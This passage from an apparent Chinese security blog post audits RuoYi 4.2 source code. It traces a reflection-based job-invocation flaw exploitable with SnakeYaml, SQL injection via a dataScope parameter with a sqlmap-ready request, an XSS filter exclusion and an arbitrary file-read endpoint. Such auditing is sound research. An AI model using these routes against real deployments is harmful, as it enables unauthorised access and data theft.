+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QuartzJob</span><br><span class="line">class QuartzJob</span><br><span class="line">implements Job</span><br><span class="line">extends Job</span><br></pre></td></tr></table></figure>
+<p><code>QuartzJob</code>直接找到文件<code>QuartzJobExecution.java</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定时任务处理（允许并发执行）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ruoyi</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuartzJobExecution</span> <span class="keyword">extends</span> <span class="title class_">AbstractQuartzJob</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doExecute</span><span class="params">(JobExecutionContext context, SysJob sysJob)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        JobInvokeUtil.invokeMethod(sysJob);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进入<code>JobInvokeUtil.invokeMethod()</code>, 发现该类解析并执行我们传入的数据, 反射调用相关的类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sysJob 系统任务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeMethod</span><span class="params">(SysJob sysJob)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">invokeTarget</span> <span class="operator">=</span> sysJob.getInvokeTarget();</span><br><span class="line">    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> getBeanName(invokeTarget);    <span class="comment">// 传入的类名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> getMethodName(invokeTarget);    <span class="comment">// 方法名</span></span><br><span class="line">    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);    <span class="comment">// 参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!isValidClassName(beanName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> SpringUtils.getBean(beanName);</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> Class.forName(beanName).newInstance();</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用的<code>invokeMethod()</code>函数如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用任务方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bean 目标对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName 方法名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodParams 方法参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeMethod</span><span class="params">(Object bean, String methodName, List&lt;Object[]&gt; methodParams)</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,</span><br><span class="line">        InvocationTargetException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotNull(methodParams) &amp;&amp; methodParams.size() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));</span><br><span class="line">        method.invoke(bean, getMethodParamsValue(methodParams));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getClass().getDeclaredMethod(methodName);</span><br><span class="line">        method.invoke(bean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>[+]我们传入的是<code>java.lang.xxx.func('aaa')</code></p>
+<ul>
+<li><code>beanName = &quot;java.lang.xxx&quot;</code></li>
+<li><code>methodName = &quot;func&quot;</code></li>
+<li><code>methodParams = &quot;aaa&quot;</code></li>
+</ul>
+<p>最终执行的反射代码为：<code>Class.forName(&quot;java.lang.xxx&quot;).getDeclaredMethod(&quot;func&quot;, String.class).invoke(Class.forName(&quot;java.lang.xxx&quot;).newInstance(), &quot;aaa&quot;)</code></p>
+<p>那么下面就是传入一个能够执行命令的类方法, <code>org.yaml.snakeyaml.Yaml</code>就满足这些条件, 所以就有了这个漏洞</p>
+<h3 id="SQL注入"><a class="header-anchor" href="#SQL注入">¶</a>SQL注入</h3>
+<p>结合mybatis 1.3.2, 这里的关键词是<code>$&#123;</code></p>
+<p>之前一直在java中寻找, 搜索之后发现只有在xml中才会有这个关键词, 在java文件中依然以sql语句形式出现</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectRoleList&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;SysRole&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;SysRoleResult&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectRoleContactVo&quot;</span>/&gt;</span></span><br><span class="line">	where r.del_flag = &#x27;0&#x27;</span><br><span class="line">       <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">	$&#123;params.dataScope&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以根据最上面的<code>&lt;mapper namespace=&quot;...&quot;&gt;</code>寻找到对应的java文件
+再根据这一段最上面的<code>&lt;select id=&quot;selectRoleList&quot; ...&gt;</code>得到是<code>selectRoleList</code>函数</p>
+<p>一路从 xml-&gt;数据访问层-&gt;服务层(业务层)-&gt;控制层</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SysRoleMapper.xml -&gt; SysRoleMapper.java -&gt; SysRoleServiceImpl.java -&gt; SysRoleController.java</span><br></pre></td></tr></table></figure>
+<p>一共两个地方在调用:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;system:role:list&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> TableDataInfo <span class="title function_">list</span><span class="params">(SysRole role)</span></span><br><span class="line">&#123;</span><br><span class="line">    startPage();</span><br><span class="line">    List&lt;SysRole&gt; list = roleService.selectRoleList(role);</span><br><span class="line">    <span class="keyword">return</span> getDataTable(list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Log(title = &quot;角色管理&quot;, businessType = BusinessType.EXPORT)</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;system:role:export&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/export&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">export</span><span class="params">(SysRole role)</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;SysRole&gt; list = roleService.selectRoleList(role);</span><br><span class="line">    ExcelUtil&lt;SysRole&gt; util = <span class="keyword">new</span> <span class="title class_">ExcelUtil</span>&lt;SysRole&gt;(SysRole.class);</span><br><span class="line">    <span class="keyword">return</span> util.exportExcel(list, <span class="string">&quot;角色数据&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先来看列表参数类型<code>SysRole</code>, 看看最开始的dataScope如何定义</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 数据范围（1：所有数据权限；2：自定义数据权限；3：本部门数据权限；4：本部门及以下数据权限） */</span>  </span><br><span class="line"><span class="meta">@Excel(name = &quot;数据范围&quot;, readConverterExp = &quot;1=所有数据权限,2=自定义数据权限,3=本部门数据权限,4=本部门及以下数据权限&quot;)</span>  </span><br><span class="line"><span class="keyword">private</span> String dataScope;</span><br></pre></td></tr></table></figure>
+<p>这一路无过滤无检查, 能直接控制, Controller直达利用点, 那打就行了</p>
+<p>前端为角色管理, 但是前端抓包没有dataScope这个参数; 但是没事, 该接⼝接收的是⼀个SysRole对象, 可以接收DataScope这个参数;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">roleName=&amp;roleKey=&amp;status=0&amp;params%5BbeginTime%5D=&amp;params%5BendTime%5D=&amp;pageS ize=10&amp;pageNum=1&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;params%5BdataScope%5D=*</span><br></pre></td></tr></table></figure>
+<p>另外一个路由同样, 所以交给sqlmap吧</p>
+<h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3>
+<blockquote>
+<p>哈哈!参考文件中没有这个, 人家是用黑盒测出来的</p>
+</blockquote>
+<p>先看看有没有filter, 一般的系统都会针对xss进行过滤</p>
+<p><code>src/main/java/com/ruoyi/common/xss/XssFilter.java</code></p>
+<p>下面是初始化代码, 初始化时获取了excludes和enabled变量</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">tempExcludes</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;excludes&quot;</span>); </span><br><span class="line">    <span class="type">String</span> <span class="variable">tempEnabled</span> <span class="operator">=</span> filterConfig.getInitParameter(<span class="string">&quot;enabled&quot;</span>);   </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span>  </span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;  </span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;  </span><br><span class="line">    <span class="keyword">if</span> (handleExcludeURL(req, resp)) <span class="comment">// excludes中的直接进if</span></span><br><span class="line">    &#123;  </span><br><span class="line">        chain.doFilter(request, response);  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">handleExcludeURL</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getServletPath();  </span><br><span class="line">    <span class="keyword">for</span> (String pattern : excludes)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^&quot;</span> + pattern);  </span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(url);  </span><br><span class="line">        <span class="keyword">if</span> (m.find()) <span class="comment">//匹配到子序列就返回true  </span></span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<p>这个变量的来源需要全局搜索excludes, 到达下面这个</p>
+<p><code>src/main/java/com/ruoyi/framework/config/FilterConfig.java</code></p>
+<p>再追踪一下</p>
+<p><code>src/main/resources/application.yml</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 防止XSS攻击  </span><br><span class="line">xss:   </span><br><span class="line">  # 过滤开关  </span><br><span class="line">  enabled: true  </span><br><span class="line">  # 排除链接（多个用逗号分隔）  </span><br><span class="line">  excludes: /system/notice/*  </span><br><span class="line">  # 匹配链接  </span><br><span class="line">  urlPatterns: /system/*,/monitor/*,/tool/*</span><br></pre></td></tr></table></figure>
+<p>所以排除链接为<code>/system/notice/*</code>, 在这个路径下进行xss的时候不会被过滤</p>
+<p>结合这个去Controller寻找对应的接口即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/system/notice 公告信息处理</span><br><span class="line">/system/notice/edit</span><br><span class="line">/system/notice/add</span><br></pre></td></tr></table></figure>
+<h3 id="任意⽂件读取"><a class="header-anchor" href="#任意⽂件读取">¶</a>任意⽂件读取</h3>
+<p>从Controller下手</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地资源通用下载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/common/download/resource&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resourceDownload</span><span class="params">(String resource, HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 本地资源路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">localPath</span> <span class="operator">=</span> Global.getProfile();</span><br><span class="line">    <span class="comment">// 数据库资源地址</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadPath</span> <span class="operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="line">    <span class="comment">// 下载名称</span></span><br><span class="line">    <span class="comment">//拿到文件名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadName</span> <span class="operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    response.setContentType(<span class="string">&quot;multipart/form-data&quot;</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attachment;fileName=&quot;</span> + FileUtils.setFileDownloadHeader(request, downloadName));</span><br><span class="line">    <span class="comment">//文件下载</span></span><br><span class="line">    FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>resource是我们可以传⼊的值 在第103⾏使⽤localPath和使⽤<code>StringUtils.substringAfter()</code>拼接形成新的路径</p>
+<p>其中<code>StringUtils.substringAfter()</code>有两个参数，⼀个resource是我们可控的 Constants.RESOURCE_PREFIX是⼀个常量/profile; 该函数⽬的是获取到/profile后⾯的字符串</p>
+<p>例如<code>http://127.0.0.1/?resource=/profile/1.txt</code>经过<code>StringUtils.substringAfter</code>⽅法处理后真正要下载的⽂件就是1.txt, 在构造payload时，要写成/profile/xxx</p>
+<p>查看localPath是从哪⾥获取的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 全局配置类  </span></span><br><span class="line"><span class="comment"> *   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> ruoyi  </span></span><br><span class="line"><span class="comment"> */</span><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ruoyi&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Global</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getProfile</span><span class="params">()</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> profile;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>@ConfigurationProperties</code>说明Global的属性值是由yml⽂件中的ruoyi来提供的</p>
+<p>来到<code>src/main/resources/application.yml</code>, 所以我们可以读取该⽬录下的⽂件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 项目相关配置  </span><br><span class="line">ruoyi:  </span><br><span class="line">  # 名称  </span><br><span class="line">  name: RuoYi  </span><br><span class="line">  # 版本  </span><br><span class="line">  version: 4.2.0  </span><br><span class="line">  # 版权年份  </span><br><span class="line">  copyrightYear: 2019  </span><br><span class="line">  # 实例演示开关  </span><br><span class="line">  demoEnabled: true  </span><br><span class="line">  # 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）  </span><br><span class="line">  profile: D:/ruoyi/uploadPath  </span><br><span class="line">  # 获取ip地址开关  </span><br><span class="line">  addressEnabled: true</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ruoyi4.2/">https://4reexile.github.io/article/ruoyi4.2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/snakeyaml-unser/" title="SnakeYaml反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">SnakeYaml反序列化</div></div></a></div><div class="next-post pull-right"><a href="/article/java-Guide/" title="Java审计指南"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Java审计指南</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/cb-chain/" title="Commons-Beanutils链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-07</div><div class="title">Commons-Beanutils链</div></div></a></div><div><a href="/article/JavaSec-pre/" title="JavaSEC搭建"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-29</div><div class="title">JavaSEC搭建</div></div></a></div><div><a href="/article/Java-ref/" title="Java反射"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-10</div><div class="title">Java反射</div></div></a></div><div><a href="/article/Java-agent/" title="Java代理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-08</div><div class="title">Java代理</div></div></a></div><div><a href="/article/Java-pre01/" title="Java反序列化漏洞核心组件"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="title">Java反序列化漏洞核心组件</div></div></a></div><div><a href="/article/java-unser/" title="Java反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="title">Java反序列化</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%AF%BB%E5%85%A8%E6%96%87"><span class="toc-number">3.2.</span> <span class="toc-text">通读全文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5"><span class="toc-number">3.3.</span> <span class="toc-text">手工</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.1.</span> <span class="toc-text">组件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">shiro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thymeleaf"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">Thymeleaf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson"><span class="toc-number">3.3.1.3.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SnakeYaml"><span class="toc-number">3.3.1.4.</span> <span class="toc-text">SnakeYaml</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">3.3.3.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.3.4.</span> <span class="toc-text">任意⽂件读取</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/6591/" title="Log4j反序列化">Log4j反序列化</a><time datetime="2025-11-21T09:04:57.368Z" title="Updated 2025-11-21 17:04:57">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java-ref/" title="Java反射">Java反射</a><time datetime="2025-11-21T09:02:26.139Z" title="Updated 2025-11-21 17:02:26">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Java-agent/" title="Java代理">Java代理</a><time datetime="2025-11-21T09:01:24.787Z" title="Updated 2025-11-21 17:01:24">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/java-unser/" title="Java反序列化">Java反序列化</a><time datetime="2025-11-21T08:56:20.002Z" title="Updated 2025-11-21 16:56:20">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/XStreadm-unser/" title="XStreadm反序列化">XStreadm反序列化</a><time datetime="2025-11-21T08:42:39.407Z" title="Updated 2025-11-21 16:42:39">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/ruoyi4.2/" title="RuoYi-4.2代码审计">RuoYi-4.2代码审计</a><time datetime="2025-11-21T08:31:46.366Z" title="Updated 2025-11-21 16:31:46">2025-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
